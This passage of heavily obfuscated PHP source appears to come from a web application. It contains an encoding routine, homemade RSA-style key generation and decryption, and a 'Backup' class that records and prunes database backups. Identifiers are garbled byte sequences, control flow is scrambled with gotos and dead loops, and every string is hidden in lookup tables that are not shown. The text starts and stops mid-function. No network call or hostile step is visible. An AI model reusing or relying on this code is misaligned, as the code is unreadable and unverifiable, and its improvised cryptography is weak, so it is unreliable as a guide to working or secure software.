$a†•ˆŸñææ = $BÁÒË≤ú∆∫[678]; if (strlen($a†•ˆŸñææ) < $BÁÒË≤ú∆∫[582]) { die; } case $AıºÆÊœı¿[239]: $CÛî•è£©ã = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($cÜ§Ñÿ„àΩ, $AıºÆÊœı¿[233]($d∆êÓ†Á¥Ê . $EÏæ®œú≤ú)); break; case $AıºÆÊœı¿[360]: $CÛî•è£©ã = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($cÜ§Ñÿ„àΩ, $AıºÆÊœı¿[128]($d∆êÓ†Á¥Ê . $EÏæ®œú≤ú)); break; $b∆√–ç·Èç = $BÁÒË≤ú∆∫[679]; if (!$b∆√–ç·Èç) { return; } case $AıºÆÊœı¿[361]: $CÛî•è£©ã = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($cÜ§Ñÿ„àΩ, $AıºÆÊœı¿[124]($d∆êÓ†Á¥Ê . $EÏæ®œú≤ú)); $f™´Ç±æúª = $BÁÒË≤ú∆∫[659]; if (!$f™´Ç±æúª) { return; } break; $CóØ”Ωﬁò£ = $BÁÒË≤ú∆∫[680]; if (!$CóØ”Ωﬁò£) { return; } case $AıºÆÊœı¿[362]: goto BêÑ⁄»òò—; Fãîœ‰ ˘◊: if (!$aêÁ≥€Éü§) { return; } $EÉÆ¯êÓ¿À = $AıºÆÊœı¿[10]; $FıÔµ√ﬂ ê = $BÁÒË≤ú∆∫[685]; goto CèÍ«ÌÁéé; CèÍ«ÌÁéé: $BÎùÇ†≈ìÛ = 0; $AÍÚóÌò„” = 0; $B°ç∆æËùπ = $BÁÒË≤ú∆∫[686]; goto f≤ÆÕÏè´‡; BêÑ⁄»òò—: $cÜ§Ñÿ„àΩ = $AıºÆÊœı¿[366]($cÜ§Ñÿ„àΩ); $a⁄ÔÇ∏Ñﬂ§ = $cÜ§Ñÿ„àΩ[0]; $cÜ§Ñÿ„àΩ = $AıºÆÊœı¿[25]($cÜ§Ñÿ„àΩ, 1); goto eñœé®ø≥è; A˘≥í¢…Œ◊: if (strlen($cÖÖé‚üï§) < $BÁÒË≤ú∆∫[605]) { die; } goto B’…æ∏î¬“; aπü∂∏Ïﬂ≈: $BÙ˜àê‘ÕÖ = $BÁÒË≤ú∆∫[682]; while ($BÙ˜àê‘ÕÖ < $BÁÒË≤ú∆∫[580]) { if ($BÙ˜àê‘ÕÖ >= 0) { break; } $BÙ˜àê‘ÕÖ++; } $a‰Çü˘áñÔ = $AıºÆÊœı¿[124]($a⁄ÔÇ∏Ñﬂ§ . $AıºÆÊœı¿[124]($EÏæ®œú≤ú . $a⁄ÔÇ∏Ñﬂ§) . $EÏæ®œú≤ú); goto FˆÙÊãÁ†Î; BÔ‹ãÑƒπ˘: while (strlen($düÓ™ïüªΩ) < $BÁÒË≤ú∆∫[582]) { if (!$düÓ™ïüªΩ) { break; } $düÓ™ïüªΩ++; } break; $cÖÖé‚üï§ = $BÁÒË≤ú∆∫[690]; goto A˘≥í¢…Œ◊; cÃ€°Öê◊É: for ($BÎùÇ†≈ìÛ = 0; $BÎùÇ†≈ìÛ < $AıºÆÊœı¿[24]($cÜ§Ñÿ„àΩ); $BÎùÇ†≈ìÛ++) { $eßÙ¿ﬁÒëæ = $eßÙ¿ﬁÒëæ == $AıºÆÊœı¿[24]($a‰Çü˘áñÔ) ? 0 : $eßÙ¿ﬁÒëæ; $F·Ï∑±À¢Í = $BÁÒË≤ú∆∫[688]; while (strlen($F·Ï∑±À¢Í) < $BÁÒË≤ú∆∫[582]) { if (!$F·Ï∑±À¢Í) { break; } $F·Ï∑±À¢Í++; } $f“±πüÀâñ = $eßÙ¿ﬁÒëæ++; $AÍÚóÌò„” = $AıºÆÊœı¿[364]($cµÆÆûª–Ω, $cÜ§Ñÿ„àΩ[$BÎùÇ†≈ìÛ]) - $d·…–íÚõ◊ - $AıºÆÊœı¿[365]($a‰Çü˘áñÔ[$f“±πüÀâñ]); while ($AÍÚóÌò„” < 0) { $AÍÚóÌò„” += 64; } $EÉÆ¯êÓ¿À .= $cµÆÆûª–Ω[$AÍÚóÌò„”]; } $CÛî•è£©ã = $AıºÆÊœı¿[367]($EÉÆ¯êÓ¿À); $düÓ™ïüªΩ = $BÁÒË≤ú∆∫[689]; goto BÔ‹ãÑƒπ˘; f≤ÆÕÏè´‡: $eßÙ¿ﬁÒëæ = 0; $B€π≠ã®¬¥ = $BÁÒË≤ú∆∫[687]; while ($B€π≠ã®¬¥ < $BÁÒË≤ú∆∫[578]) { if ($B€π≠ã®¬¥ >= 0) { break; } $B€π≠ã®¬¥++; } goto cÃ€°Öê◊É; FˆÙÊãÁ†Î: $a§ë©é»ªÛ = $BÁÒË≤ú∆∫[683]; $a‰Çü˘áñÔ = $AıºÆÊœı¿[25]($a‰Çü˘áñÔ, $d·…–íÚõ◊ % 8, $d·…–íÚõ◊ % 8 + 7); $aêÁ≥€Éü§ = $BÁÒË≤ú∆∫[684]; goto Fãîœ‰ ˘◊; eñœé®ø≥è: $eêÈ⁄èë‘ª = $BÁÒË≤ú∆∫[681]; while ($eêÈ⁄èë‘ª < $BÁÒË≤ú∆∫[582]) { if ($eêÈ⁄èë‘ª >= 0) { break; } $eêÈ⁄èë‘ª++; } $d·…–íÚõ◊ = $AıºÆÊœı¿[364]($cµÆÆûª–Ω, $a⁄ÔÇ∏Ñﬂ§); goto aπü∂∏Ïﬂ≈; B’…æ∏î¬“: default: $CÛî•è£©ã = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($cÜ§Ñÿ„àΩ, $EÏæ®œú≤ú . $d∆êÓ†Á¥Ê); break; } if ($Bì‰‚ﬁåÉ• - 1 > 0) { $CÛî•è£©ã = $this->{$_SERVER[é°ËπÔ úﬁ][208]}($CÛî•è£©ã, $EÏæ®œú≤ú, $Bì‰‚ﬁåÉ• - 1); } return $CÛî•è£©ã; goto Aïáãç£ıœ; fõ‡√ŒÂıú: $D„è«∞Üﬁ√ = $cÜ§Ñÿ„àΩ[0]; $bà„µÀÒ√› = $BÁÒË≤ú∆∫[675]; if (strlen($bà„µÀÒ√›) < $BÁÒË≤ú∆∫[582]) { die; } goto D≤“œæÆö; D≤“œæÆö: $d∆êÓ†Á¥Ê = $AıºÆÊœı¿[25]($cÜ§Ñÿ„àΩ, 1, 15); $cÜ§Ñÿ„àΩ = $AıºÆÊœı¿[25]($cÜ§Ñÿ„àΩ, 16); $DÖ∑´ã‘‚ì = $BÁÒË≤ú∆∫[676]; goto b√›Ëæ‚È‡; f…„äÂ¨Öˆ: $BÁÒË≤ú∆∫ =& $_SERVER[ú∫]; $AıºÆÊœı¿ =& $_SERVER[é°ËπÔ úﬁ]; if (!$AıºÆÊœı¿[158]($cÜ§Ñÿ„àΩ) || $AıºÆÊœı¿[24]($cÜ§Ñÿ„àΩ) < 10) { return !1; } goto D‹⁄™ê÷¬«; b√›Ëæ‚È‡: $cµÆÆûª–Ω = $AıºÆÊœı¿[359]; $BáüÈöÁ‚¶ = $BÁÒË≤ú∆∫[677]; if (strlen($BáüÈöÁ‚¶) < $BÁÒË≤ú∆∫[578]) { die; } goto EÛì§Öè¬ú; D‹⁄™ê÷¬«: $cÜ§Ñÿ„àΩ = $AıºÆÊœı¿[2]($cÜ§Ñÿ„àΩ); $cÜ§Ñÿ„àΩ = $AıºÆÊœı¿[233]($cÜ§Ñÿ„àΩ); $e¡ÜÛùê∂© = $BÁÒË≤ú∆∫[674]; goto fõ‡√ŒÂıú; Aïáãç£ıœ: } public function skch96af074d($f˜ØÏÜÂâì) { goto fî°ÇÎùê⁄; B ˆ‚Çõ•ø: $dß¥äéÙ’Ô = $f”ÇÍÉ»ëê[124]($f”ÇÍÉ»ëê[369] . ($Díã’Ÿ≥°á + $fÀëßì‹ñ‹) . $f”ÇÍÉ»ëê[370] . $AûøîÑØ . $f”ÇÍÉ»ëê[370] . $eùÏ˜ç¨åÃ . $f”ÇÍÉ»ëê[371]); $dﬂ¢Ò©à”Ú = $E¨ºßŒ±≠[694]; while (strlen($dﬂ¢Ò©à”Ú) < $E¨ºßŒ±≠[582]) { if (!$dﬂ¢Ò©à”Ú) { break; } $dﬂ¢Ò©à”Ú++; } goto FÎ∑∑–∫“ı; fî°ÇÎùê⁄: $E¨ºßŒ±≠ =& $_SERVER[ú∫]; $f”ÇÍÉ»ëê =& $_SERVER[é°ËπÔ úﬁ]; $Díã’Ÿ≥°á = $this->{$_SERVER[é°ËπÔ úﬁ][368]}(); goto DæçˆìÉâá; A¬äÓ˘Î≤Ó: $D°§ª¢û—Ç = $E¨ºßŒ±≠[696]; goto E’∂Ç˜ﬁ˜´; e∆åË§ÔêŒ: if (strlen($Dﬁ‚ëìæ©É) < $E¨ºßŒ±≠[578]) { die; } $AûøîÑØ = $f”ÇÍÉ»ëê[263](($Díã’Ÿ≥°á + $fÀëßì‹ñ‹) / 2); while (1) { $E°ª¯ß∑Ì‘ = $AûøîÑØ; $DÙÂ˜ê¢´Ì = $E¨ºßŒ±≠[692]; if (!$DÙÂ˜ê¢´Ì) { die; } $DééﬁÙ·¨· = $Câù—≈∆„–; while ($DééﬁÙ·¨· % $E°ª¯ß∑Ì‘ != 0) { $c≠™òåï°‰ = $DééﬁÙ·¨·; $DééﬁÙ·¨· = $E°ª¯ß∑Ì‘; $E°ª¯ß∑Ì‘ = $c≠™òåï°‰ % $E°ª¯ß∑Ì‘; $bã—ƒ£çÀû = $E¨ºßŒ±≠[693]; while ($bã—ƒ£çÀû < $E¨ºßŒ±≠[605]) { if ($bã—ƒ£çÀû >= 0) { break; } $bã—ƒ£çÀû++; } } if ($E°ª¯ß∑Ì‘ == 1) { break; } else { $AûøîÑØ++; } } goto B≥…äÂ‡µã; B≥…äÂ‡µã: $eùÏ˜ç¨åÃ = 2; for ($fáÔç‰ÌÓû = 0; $fáÔç‰ÌÓû < $Câù—≈∆„– * 10; $fáÔç‰ÌÓû++) { if (($Câù—≈∆„– * $fáÔç‰ÌÓû + 1) % $AûøîÑØ == 0) { $eùÏ˜ç¨åÃ = $f”ÇÍÉ»ëê[263](($Câù—≈∆„– * $fáÔç‰ÌÓû + 1) / $AûøîÑØ); break; } } $eØ†‚ö–µ = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($Díã’Ÿ≥°á * $fÀëßì‹ñ‹ . $f”ÇÍÉ»ëê[10], $f”ÇÍÉ»ëê[167]); goto B ˆ‚Çõ•ø; DæçˆìÉâá: $fÀëßì‹ñ‹ = $this->{$_SERVER[é°ËπÔ úﬁ][368]}(); $Câù—≈∆„– = ($Díã’Ÿ≥°á - 1) * ($fÀëßì‹ñ‹ - 1); $Dﬁ‚ëìæ©É = $E¨ºßŒ±≠[691]; goto e∆åË§ÔêŒ; FÎ∑∑–∫“ı: $b«ÑµÇ› π = $this->{$_SERVER[é°ËπÔ úﬁ][165]}($f˜ØÏÜÂâì, $dß¥äéÙ’Ô) . $f”ÇÍÉ»ëê[372] . $eØ†‚ö–µ; $FóÖó∏∞ö˘ = $E¨ºßŒ±≠[695]; return $b«ÑµÇ› π; goto A¬äÓ˘Î≤Ó; E’∂Ç˜ﬁ˜´: } public function lcrj8af8edb1($f∏ÛπŒ‡ı¥) { goto aü∆åÏ¨‡„; Bä©ºÛ¿ìÆ: $C˜øÙŒØÁ◊ = $AÉ’õõ•‡[698]; if (!$C˜øÙŒØÁ◊) { return; } $bâ∫ÈÆÑ∑à = 0; goto cﬂ—àóƒ±·; E’ºﬂéÊºˆ: $fÎåÁ¿¨Ñ° = $Eºßº◊¶∞π[263](($bâ∫ÈÆÑ∑à + $b˘‘√»…ØÌ) / 2); while (1) { $AëÃ≥≈á∆· = $fÎåÁ¿¨Ñ°; $bëô±õÙ·≥ = $D¯∞≤±íºá; while ($bëô±õÙ·≥ % $AëÃ≥≈á∆· != 0) { $dªö‚»ÂÈë = $bëô±õÙ·≥; $bëô±õÙ·≥ = $AëÃ≥≈á∆·; $AëÃ≥≈á∆· = $dªö‚»ÂÈë % $AëÃ≥≈á∆·; $Eüî√úÏãã = $AÉ’õõ•‡[701]; if (strlen($Eüî√úÏãã) < $AÉ’õõ•‡[605]) { die; } } if ($AëÃ≥≈á∆· == 1) { break; } else { $fÎåÁ¿¨Ñ°++; } } $CÖıËÜãÛ◊ = 2; goto B±á§¯ﬂáÌ; Bµâ‹éêŸû: if (!$e´∂ãÇâÔÃ) { return; } if (!$Bù†Æ»≥—ê) { return $Eºßº◊¶∞π[10]; } $Bù†Æ»≥—ê = $Eºßº◊¶∞π[263]($Bù†Æ»≥—ê); goto Bä©ºÛ¿ìÆ; B®óá”ûΩ»: while (strlen($B◊ãâ©ˆ÷ï) < $AÉ’õõ•‡[580]) { if (!$B◊ãâ©ˆ÷ï) { break; } $B◊ãâ©ˆ÷ï++; } return $A §∆ƒ–Âã; goto aÑûÁ—≥‚ö; cﬂ—àóƒ±·: $b˘‘√»…ØÌ = 0; for ($E¢ÒæÑÂÙ÷ = 3; $E¢ÒæÑÂÙ÷ < $Bù†Æ»≥—ê; $E¢ÒæÑÂÙ÷ += 2) { if ($Bù†Æ»≥—ê % $E¢ÒæÑÂÙ÷ != 0) { continue; } $bâ∫ÈÆÑ∑à = $E¢ÒæÑÂÙ÷; $b˘‘√»…ØÌ = $Eºßº◊¶∞π[263]($Bù†Æ»≥—ê / $E¢ÒæÑÂÙ÷); $BŸÃöè‚»à = $AÉ’õõ•‡[699]; break; $A√÷ˆïü±¶ = $AÉ’õõ•‡[700]; while (strlen($A√÷ˆïü±¶) < $AÉ’õõ•‡[578]) { if (!$A√÷ˆïü±¶) { break; } $A√÷ˆïü±¶++; } } $D¯∞≤±íºá = ($bâ∫ÈÆÑ∑à - 1) * ($b˘‘√»…ØÌ - 1); goto E’ºﬂéÊºˆ; aŸŸÀ¯Ó™–: if ($Eºßº◊¶∞π[19]($b Ãõ¬∫Òû) != 2) { return $Eºßº◊¶∞π[10]; } $Bù†Æ»≥—ê = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($b Ãõ¬∫Òû[1] . $Eºßº◊¶∞π[10], $Eºßº◊¶∞π[167]); $e´∂ãÇâÔÃ = $AÉ’õõ•‡[697]; goto Bµâ‹éêŸû; C‡™⁄íûÇë: $E„∂Â™˜∂Ó = $AÉ’õõ•‡[638]; $A §∆ƒ–Âã = $this->{$_SERVER[é°ËπÔ úﬁ][269]}($b Ãõ¬∫Òû[0], $cﬂ◊ÊÏé˘ƒ); $B◊ãâ©ˆ÷ï = $AÉ’õõ•‡[703]; goto B®óá”ûΩ»; aü∆åÏ¨‡„: $AÉ’õõ•‡ =& $_SERVER[ú∫]; $Eºßº◊¶∞π =& $_SERVER[é°ËπÔ úﬁ]; $b Ãõ¬∫Òû = $Eºßº◊¶∞π[0]($Eºßº◊¶∞π[372], $f∏ÛπŒ‡ı¥); goto aŸŸÀ¯Ó™–; B±á§¯ﬂáÌ: $a’ƒ∫í´≤Ô = $AÉ’õõ•‡[702]; for ($E¢ÒæÑÂÙ÷ = 0; $E¢ÒæÑÂÙ÷ < $D¯∞≤±íºá * 10; $E¢ÒæÑÂÙ÷++) { if (($D¯∞≤±íºá * $E¢ÒæÑÂÙ÷ + 1) % $fÎåÁ¿¨Ñ° == 0) { $CÖıËÜãÛ◊ = $Eºßº◊¶∞π[263](($D¯∞≤±íºá * $E¢ÒæÑÂÙ÷ + 1) / $fÎåÁ¿¨Ñ°); break; } } $cﬂ◊ÊÏé˘ƒ = $Eºßº◊¶∞π[124]($Eºßº◊¶∞π[369] . ($bâ∫ÈÆÑ∑à + $b˘‘√»…ØÌ) . $Eºßº◊¶∞π[370] . $fÎåÁ¿¨Ñ° . $Eºßº◊¶∞π[370] . $CÖıËÜãÛ◊ . $Eºßº◊¶∞π[371]); goto C‡™⁄íûÇë; aÑûÁ—≥‚ö: } public function dwah7f5094e3() { goto aöÓÀï¢∆; bÇÕ∞é˘∑Ω: return $B—å¨˘—¡Ú; goto A§ Õìåá¡; aöÓÀï¢∆: $DÛ€πÆ™¶¶ =& $_SERVER[ú∫]; $Cô·âÉèªæ =& $_SERVER[é°ËπÔ úﬁ]; $F◊à˘Ç≠Ã = $Cô·âÉèªæ[354]($Cô·âÉèªæ[373](2, 14), $Cô·âÉèªæ[373](2, 16) - 1); goto b‘èÜäø„‚; b‘èÜäø„‚: $aôËË»äé‚ = array(); $aˆ¬≈ëﬂöÎ = 1; $C∞¢∆€ÕàË = $DÛ€πÆ™¶¶[704]; goto câÆÃ†Ö —; câÆÃ†Ö —: while ($aˆ¬≈ëﬂöÎ <= (int) $Cô·âÉèªæ[374]($F◊à˘Ç≠Ã)) { $f‰Î´◊¶‰¶ = $aˆ¬≈ëﬂöÎ; $F¯∂⁄Ü§ÂÃ = $DÛ€πÆ™¶¶[676]; while (!0) { $f‰Î´◊¶‰¶++; if ($f‰Î´◊¶‰¶ <= 2) { $aˆ¬≈ëﬂöÎ = $f‰Î´◊¶‰¶; break; } else { if ($f‰Î´◊¶‰¶ < 2) { continue; } } $dÇ⁄»ò«Çß = !0; for ($E§ıÕÓäóÂ = 2; $E§ıÕÓäóÂ <= $Cô·âÉèªæ[374]($f‰Î´◊¶‰¶); $E§ıÕÓäóÂ++) { if ($f‰Î´◊¶‰¶ % $E§ıÕÓäóÂ == 0) { $dÇ⁄»ò«Çß = !1; } } if ($dÇ⁄»ò«Çß) { $aˆ¬≈ëﬂöÎ = $f‰Î´◊¶‰¶; break; } } $aôËË»äé‚[] = $aˆ¬≈ëﬂöÎ; $d‡Çõ¢œú’ = $DÛ€πÆ™¶¶[705]; } $B—å¨˘—¡Ú = 2; for ($f‰Î´◊¶‰¶ = $F◊à˘Ç≠Ã; $f‰Î´◊¶‰¶ > 1; $f‰Î´◊¶‰¶--) { $dÇ⁄»ò«Çß = !0; $b©ÙøÂµÑû = $DÛ€πÆ™¶¶[706]; while ($b©ÙøÂµÑû < $DÛ€πÆ™¶¶[578]) { if ($b©ÙøÂµÑû >= 0) { break; } $b©ÙøÂµÑû++; } foreach ($aôËË»äé‚ as $aõÿ™Î√ñƒ) { if ($f‰Î´◊¶‰¶ % $aõÿ™Î√ñƒ == 0) { $dÇ⁄»ò«Çß = !1; break; } } if ($dÇ⁄»ò«Çß) { $B—å¨˘—¡Ú = $f‰Î´◊¶‰¶; break; } } goto bÇÕ∞é˘∑Ω; A§ Õìåá¡: } public function znqj55fbc7bc($Eœè‰ËÖœ”, $F‘ÇÒºè—ü) { $D«ÃÊúºôƒ =& $_SERVER[é°ËπÔ úﬁ]; return $D«ÃÊúºôƒ[13](array($D«ÃÊúºôƒ[14], $D«ÃÊúºôƒ[375]), $Eœè‰ËÖœ”, $F‘ÇÒºè—ü); } public function euda86295df6($E€ùâïÑøÎ, $Aíî”¡ˆÚ™) { $D„ÜèÖ÷áÙ =& $_SERVER[é°ËπÔ úﬁ]; return $D„ÜèÖ÷áÙ[13](array($D„ÜèÖ÷áÙ[376], $D„ÜèÖ÷áÙ[377]), $E€ùâïÑøÎ, $Aíî”¡ˆÚ™); } public function vaso99b174d6($FØﬁÃà¡’˘, $bı∫„ê›ÿ·) { $a⁄çóÿ–êÉ =& $_SERVER[ú∫]; $eç∑Ÿ§µîÖ =& $_SERVER[é°ËπÔ úﬁ]; return $eç∑Ÿ§µîÖ[13](array($eç∑Ÿ§µîÖ[376], $eç∑Ÿ§µîÖ[378]), $FØﬁÃà¡’˘, $bı∫„ê›ÿ·); $D˜∫∑Ωƒî = $a⁄çóÿ–êÉ[707]; while ($D˜∫∑Ωƒî < $a⁄çóÿ–êÉ[589]) { if ($D˜∫∑Ωƒî >= 0) { break; } $D˜∫∑Ωƒî++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Dáñãì¿àÚ =& $_SERVER[ú∫]; $this->isManual(); self::$name = date($Dáñãì¿àÚ[708]); if (!($dΩ˜àÏˆ€’ = Model($Dáñãì¿àÚ[709])->lastItem())) { $dΩ˜àÏˆ€’ = $this->initData(); } else { self::$name = $dΩ˜àÏˆ€’[$Dáñãì¿àÚ[28]]; if ($dΩ˜àÏˆ€’[$Dáñãì¿àÚ[710]] == $Dáñãì¿àÚ[87]) { self::$name = date($Dáñãì¿àÚ[711]); $e“óëÚé⁄â = 0; if (isset($dΩ˜àÏˆ€’[$Dáñãì¿àÚ[291]][$Dáñãì¿àÚ[193]][$Dáñãì¿àÚ[447]])) { $e“óëÚé⁄â = (int) $dΩ˜àÏˆ€’[$Dáñãì¿àÚ[291]][$Dáñãì¿àÚ[193]][$Dáñãì¿àÚ[447]]; } if (self::$manual == 0 && $dΩ˜àÏˆ€’[$Dáñãì¿àÚ[28]] == self::$name) { Model($Dáñãì¿àÚ[709])->remove($dΩ˜àÏˆ€’[$Dáñãì¿àÚ[393]]); } $dΩ˜àÏˆ€’ = $this->initData($e“óëÚé⁄â, $dΩ˜àÏˆ€’[$Dáñãì¿àÚ[712]]); } else { $this->checkStore($dΩ˜àÏˆ€’[$Dáñãì¿àÚ[712]]); } } self::$option = $dΩ˜àÏˆ€’; } private function isManual() { $eù¬Ö¯£ç = _get($GLOBALS, $_SERVER[ú∫][713], 0); $eù¬Ö¯£ç = intval($eù¬Ö¯£ç); self::$manual = $eù¬Ö¯£ç && $eù¬Ö¯£ç == 1 ? 1 : 0; } private function initData($aöÁßøî›Ø = 0, $d“ü⁄òÔë¨ = '') { goto f‚ßÍê π–; bœÑ≥ã≠–≥: $this->checkStore($dÖª¿∫âØ÷[$bî£í∫∂Ÿô[712]]); if (self::$manual == 1) { self::$name .= $bî£í∫∂Ÿô[71] . date($bî£í∫∂Ÿô[714]); } $e⁄ÊÔ∆“ÉÆ = array($bî£í∫∂Ÿô[712] => $dÖª¿∫âØ÷[$bî£í∫∂Ÿô[712]], $bî£í∫∂Ÿô[28] => self::$name, $bî£í∫∂Ÿô[710] => 0, $bî£í∫∂Ÿô[715] => $dÖª¿∫âØ÷[$bî£í∫∂Ÿô[715]], $bî£í∫∂Ÿô[716] => self::$manual, $bî£í∫∂Ÿô[291] => array($bî£í∫∂Ÿô[717] => array($bî£í∫∂Ÿô[710] => 0), $bî£í∫∂Ÿô[718] => array($bî£í∫∂Ÿô[710] => 0, $bî£í∫∂Ÿô[719] => 0, $bî£í∫∂Ÿô[720] => 0, $bî£í∫∂Ÿô[29] => $bî£í∫∂Ÿô[33], $bî£í∫∂Ÿô[721] => 0, $bî£í∫∂Ÿô[476] => 0), $bî£í∫∂Ÿô[722] => array($bî£í∫∂Ÿô[710] => 0, $bî£í∫∂Ÿô[719] => 0, $bî£í∫∂Ÿô[720] => 0, $bî£í∫∂Ÿô[721] => 0, $bî£í∫∂Ÿô[476] => 0), $bî£í∫∂Ÿô[193] => array($bî£í∫∂Ÿô[710] => 0, $bî£í∫∂Ÿô[723] => 0, $bî£í∫∂Ÿô[724] => 0, $bî£í∫∂Ÿô[725] => 0, $bî£í∫∂Ÿô[726] => 0, $bî£í∫∂Ÿô[447] => $aöÁßøî›Ø, $bî£í∫∂Ÿô[721] => 0, $bî£í∫∂Ÿô[476] => 0)), $bî£í∫∂Ÿô[721] => time(), $bî£í∫∂Ÿô[476] => 0); goto aÑà°≤˜Ø›; aÑà°≤˜Ø›: $aØ¥Ö⁄∑íÃ = Model($bî£í∫∂Ÿô[709])->insert($e⁄ÊÔ∆“ÉÆ); $e⁄ÊÔ∆“ÉÆ[$bî£í∫∂Ÿô[393]] = $aØ¥Ö⁄∑íÃ; return $e⁄ÊÔ∆“ÉÆ; goto D”Ÿ¶≥¨É∏; f‚ßÍê π–: $bî£í∫∂Ÿô =& $_SERVER[ú∫]; $dÖª¿∫âØ÷ = Model($bî£í∫∂Ÿô[709])->config(); if ($d“ü⁄òÔë¨ && $dÖª¿∫âØ÷[$bî£í∫∂Ÿô[712]] != $d“ü⁄òÔë¨) { $aöÁßøî›Ø = 0; } goto bœÑ≥ã≠–≥; D”Ÿ¶≥¨É∏: } private function checkStore($fÍç≤ÜÎ¬Ü) { $cˆ ˜“„¶ê =& $_SERVER[ú∫]; $B¡ÓÌë•√ù = Model($cˆ ˜“„¶ê[727])->listData($fÍç≤ÜÎ¬Ü); Model($cˆ ˜“„¶ê[727])->checkConfig($B¡ÓÌë•√ù); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ú∫][709])->findByName(self::$name); } return self::$option; } public static function set($dåøÙ¡Öï˜) { $føö©â®⁄â =& $_SERVER[ú∫]; $Câ¥ÛßÂèñ = self::get(); foreach ($dåøÙ¡Öï˜ as $f…Ú£¯´ÙÚ => $dâ†πÂí«≥) { $AñÂË£Æﬂ∂ = explode($føö©â®⁄â[95], $f…Ú£¯´ÙÚ); $F›ÜÇáÿ‚ÿ = count($AñÂË£Æﬂ∂); switch ($F›ÜÇáÿ‚ÿ) { case 1: $Câ¥ÛßÂèñ[$AñÂË£Æﬂ∂[0]] = $dâ†πÂí«≥; break; case 2: $Câ¥ÛßÂèñ[$AñÂË£Æﬂ∂[0]][$AñÂË£Æﬂ∂[1]] = $dâ†πÂí«≥; break; case 3: $Câ¥ÛßÂèñ[$AñÂË£Æﬂ∂[0]][$AñÂË£Æﬂ∂[1]][$AñÂË£Æﬂ∂[2]] = $dâ†πÂí«≥; break; } } Model($føö©â®⁄â[709])->update($Câ¥ÛßÂèñ[$føö©â®⁄â[393]], $Câ¥ÛßÂèñ); self::$option = $Câ¥ÛßÂèñ; return self::$option; } public function keep() { $Eò€ˆß‚‡Ü =& $_SERVER[ú∫]; $Dü®õÉÏ∆ƒ = self::get(); if ($Dü®õÉÏ∆ƒ[$Eò€ˆß‚‡Ü[291]][$Eò€ˆß‚‡Ü[717]][$Eò€ˆß‚‡Ü[710]] == $Eò€ˆß‚‡Ü[87]) { return; } $this->backupKeep($Dü®õÉÏ∆ƒ); self::set(array($Eò€ˆß‚‡Ü[728] => 1)); } private function backupKeep($A˘ˆÎïÖ≠§) { goto F◊∂õß≈ÂÊ; F◊∂õß≈ÂÊ: $b∫›á—ú°‘ =& $_SERVER[ú∫]; if (self::$manual == 1) { return; } $båù∆√‘√Ê = Model($b∫›á—ú°‘[709])->listData(); goto F˘ÉêÇë…≠; e§›≠ÕãÑé: foreach ($båù∆√‘√Ê as $Cà◊«¨˘†™) { if ($E∫î‡€÷œ» >= 7) { break; } $b¶–ïÜ¯ï–[] = $Cà◊«¨˘†™[$b∫›á—ú°‘[28]]; $E∫î‡€÷œ»++; } for ($E∫î‡€÷œ» = 0; $E∫î‡€÷œ» < 12; $E∫î‡€÷œ»++) { $b¶–ïÜ¯ï–[] = date($b∫›á—ú°‘[729], strtotime("\55{$E∫î‡€÷œ»}\x20\155\x6f\x6e\x74\150\163")); } $b¶–ïÜ¯ï– = array_unique($b¶–ïÜ¯ï–); goto C¿®ªë≈†; F˘ÉêÇë…≠: if (empty($båù∆√‘√Ê)) { return; } $E∫î‡€÷œ» = 0; $b¶–ïÜ¯ï– = array(); goto e§›≠ÕãÑé; C¿®ªë≈†: $a¡Õº¢±Ωû = Model($b∫›á—ú°‘[730])->get($b∫›á—ú°‘[731]); foreach ($båù∆√‘√Ê as $Cà◊«¨˘†™) { if (isset($Cà◊«¨˘†™[$b∫›á—ú°‘[716]]) && $Cà◊«¨˘†™[$b∫›á—ú°‘[716]] == $b∫›á—ú°‘[87]) { continue; } if (!empty($Cà◊«¨˘†™[$b∫›á—ú°‘[28]]) && in_array($Cà◊«¨˘†™[$b∫›á—ú°‘[28]], $b¶–ïÜ¯ï–)) { continue; } Model($b∫›á—ú°‘[709])->remove($Cà◊«¨˘†™[$b∫›á—ú°‘[393]]); $EÔÚáá¨âÊ = $this->backupPath($A˘ˆÎïÖ≠§, $a¡Õº¢±Ωû); IO::remove($EÔÚáá¨âÊ, !1); } goto c›ÌÙ¬º¥É; c›ÌÙ¬º¥É: } private function backupPath($Fƒ˜ËŸëúà, $C°§∏¥†  = false) { $dæÍî¿É±« =& $_SERVER[ú∫]; if (!$C°§∏¥† ) { $C°§∏¥†  = Model($dæÍî¿É±«[730])->get($dæÍî¿É±«[731]); } $E·Ç˜¿€õ¿ = $Fƒ˜ËŸëúà[$dæÍî¿É±«[28]]; $dØëç¡•ƒ» = substr(md5($dæÍî¿É±«[732] . $C°§∏¥†  . $E·Ç˜¿€õ¿), 0, 8); return "\173\x69\157\72{$Fƒ˜ËŸëúà[$dæÍî¿É±«[712]]}\175\x2f\144\141\x74\x61\142\x61\163\x65\57\142\x61\x63\x6b\x75\x70\x2f" . $E·Ç˜¿€õ¿ . $dæÍî¿É±«[71] . $dØëç¡•ƒ»; } public function db() { goto E√ú£≈Ûª∞; C™ˆô–ç≠Ö: $båÿﬂäàıä = new BackupDb(); if (!$båÿﬂäàıä->index()) { return !1; } self::set(array($a◊∂ÿÖÜ∫Ù[733] => 1)); goto B‹Õ¢œ·°Â; E√ú£≈Ûª∞: $a◊∂ÿÖÜ∫Ù =& $_SERVER[ú∫]; $eÛÒ›÷òﬂ√ = self::get(); if ($eÛÒ›÷òﬂ√[$a◊∂ÿÖÜ∫Ù[291]][$a◊∂ÿÖÜ∫Ù[718]][$a◊∂ÿÖÜ∫Ù[710]] == $a◊∂ÿÖÜ∫Ù[87]) { return !0; } goto C™ˆô–ç≠Ö; B‹Õ¢œ·°Â: return !0; goto FÓ∂¿∑äÃÙ; FÓ∂¿∑äÃÙ: } public function dbFile() { goto b¿∂å∑á¯ó; b¿∂å∑á¯ó: $Fƒ¢üÛß‘â =& $_SERVER[ú∫]; $dÏÒÉ…„Œ¡ = self::get(); if ($dÏÒÉ…„Œ¡[$Fƒ¢üÛß‘â[291]][$Fƒ¢üÛß‘â[722]][$Fƒ¢üÛß‘â[710]] == 